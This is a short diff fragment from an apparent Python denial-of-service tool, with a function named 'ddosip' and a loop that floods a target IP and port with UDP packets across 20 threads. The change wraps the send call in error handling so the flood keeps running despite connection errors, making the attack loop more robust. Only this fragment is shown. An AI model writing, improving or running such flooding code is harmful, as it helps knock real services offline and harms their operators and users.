@@ -71,7 +71,10 @@ def ddosip(ip):
 
 def aa(num):
     while True:
-        sock.sendto(bytes, (ip, port))
+        try:
+            sock.sendto(bytes, (ip, port))
+        except:
+            print(colorama.Fore.RED + "[-] Connection error!")
 
 threads = 20
 
